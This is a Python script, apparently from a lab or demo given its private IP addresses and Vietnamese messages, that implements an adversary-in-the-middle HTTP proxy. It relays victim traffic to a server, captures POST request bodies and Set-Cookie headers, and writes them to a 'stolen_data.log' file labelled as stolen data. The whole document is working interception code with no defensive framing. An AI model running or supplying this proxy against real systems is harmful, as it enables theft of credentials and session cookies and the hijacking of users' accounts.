#!/usr/bin/env python3
import socket, threading

SERVER_IP = '192.168.1.10'
SERVER_PORT = 80

def handle_client(client_socket):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect((SERVER_IP, SERVER_PORT))

    def forward(src, dst, direction):
        try:
            while True:
                data = src.recv(4096)
                if not data: break
                
                if direction == "TO_SERVER" and b"POST" in data:
                    print("\n[!] [ATTACKER] DANH CAP REQUEST TU NAN NHAN:")
                    payload = data.decode('utf-8', errors='ignore')
                    body = payload.split('\r\n\r\n')[1]
                    print(f"   -> Du lieu nhay cam: {body}")
                    with open("stolen_data.log", "a") as f:
                        f.write(f"REQUEST_BODY: {body}\n")
                        
                if direction == "TO_VICTIM" and b"Set-Cookie" in data:
                    print("\n[!] [ATTACKER] DANH CAP SESSION COOKIE TU SERVER:")
                    headers = data.decode('utf-8', errors='ignore').split('\r\n')
                    for h in headers:
                        if "Set-Cookie" in h: 
                            print(f"   -> Bat duoc: {h}")
                            with open("stolen_data.log", "a") as f:
                                f.write(f"STOLEN_COOKIE: {h}\n")
                                
                dst.send(data)
        except: pass

    threading.Thread(target=forward, args=(client_socket, server_socket, "TO_SERVER")).start()
    threading.Thread(target=forward, args=(server_socket, client_socket, "TO_VICTIM")).start()

proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
proxy.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
proxy.bind(('0.0.0.0', 80))
proxy.listen(5)

print("[*] AiTM Proxy dang lang nghe tai 192.168.1.30:80...")
print("[*] Luong du lieu: Victim -> [Proxy] -> Server")
while True:
    client, addr = proxy.accept()
    handle_client(client)
